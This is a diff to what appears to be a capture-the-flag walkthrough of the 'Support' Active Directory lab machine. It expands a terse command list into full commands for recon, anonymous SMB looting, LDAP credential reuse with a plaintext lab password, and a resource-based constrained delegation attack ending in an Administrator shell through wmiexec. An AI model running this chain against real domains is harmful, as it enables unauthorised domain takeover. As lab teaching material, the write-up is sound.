@@ -118,18 +118,90 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 AD Recon</b></summary>
 
-- `smbclient -N //support.htb/support-tools`
-- `strings/UserInfo.exe.config review for LDAP bind secret`
-- `ldapsearch authenticated query for user attributes`
-- `impacket-addcomputer support.htb/... EVILPC$`
-- `rbcd.py / bloodyAD to configure delegation`
-- `getST.py -spn cifs/DC.SUPPORT.HTB -impersonate Administrator`
-- `wmiexec.py -k -no-pass support.htb/Administrator@DC.SUPPORT.HTB`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.200.150
+sudo nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 10.129.200.150
+ldapsearch -x -H ldap://10.129.200.150 -s base namingcontexts
+nxc smb 10.129.200.150 -u '' -p '' --shares
+```
 
 </details>
+
+<details open>
+<summary><b>📁 Anonymous SMB Loot</b></summary>
+
+```bash
+smbclient -N -L //10.129.200.150/
+smbclient -N //10.129.200.150/support-tools -c 'recurse; ls'
+smbclient -N //10.129.200.150/support-tools -c 'get UserInfo.exe.zip'
+unzip UserInfo.exe.zip
+strings UserInfo.exe | less
+```
+
+</details>
+
+<details open>
+<summary><b>🧾 LDAP Credential and User Attribute Discovery</b></summary>
+
+```bash
+# Bind with recovered LDAP credential from the support tool
+ldapsearch -x -H ldap://10.129.200.150 \
+  -D 'support\\ldap' \
+  -w '<recovered-ldap-password>' \
+  -b 'DC=support,DC=htb' \
+  '(objectClass=user)' sAMAccountName info description
+
+# Validate recovered support password
+nxc smb 10.129.200.150 -d support.htb -u support -p 'Ironside47pleasure40Watchful'
+nxc ldap 10.129.200.150 -d support.htb -u support -p 'Ironside47pleasure40Watchful' --users
+```
+
+</details>
+
+<details open>
+<summary><b>🕸️ BloodHound / RBCD Path</b></summary>
+
+```bash
+nxc ldap 10.129.200.150 -d support.htb \
+  -u support -p 'Ironside47pleasure40Watchful' \
+  --bloodhound --collection All --dns-server 10.129.200.150
+
+# Create controlled machine account
+impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
+  -dc-ip 10.129.200.150 \
+  -computer-name 'EVILPC$' \
+  -computer-pass 'EvilPass123!'
+```
+
+</details>
+
+<details open>
+<summary><b>👑 RBCD to Administrator</b></summary>
+
+```bash
+# Configure RBCD on DC computer object using the GenericAll edge
+rbcd.py -delegate-from 'EVILPC$' \
+  -delegate-to 'DC$' \
+  -dc-ip 10.129.200.150 \
+  -action write \
+  support.htb/support:'Ironside47pleasure40Watchful'
+
+# Request service ticket impersonating Administrator
+getST.py -spn cifs/DC.SUPPORT.HTB \
+  -impersonate Administrator \
+  -dc-ip 10.129.200.150 \
+  support.htb/'EVILPC$':'EvilPass123!'
+
+export KRB5CCNAME=Administrator.ccache
+wmiexec.py -k -no-pass support.htb/Administrator@DC.SUPPORT.HTB
+wmiexec.py -k -no-pass support.htb/Administrator@DC.SUPPORT.HTB 'type C:\Users\Administrator\Desktop\root.txt'
+```
+
+</details>
+
 
 ---
 
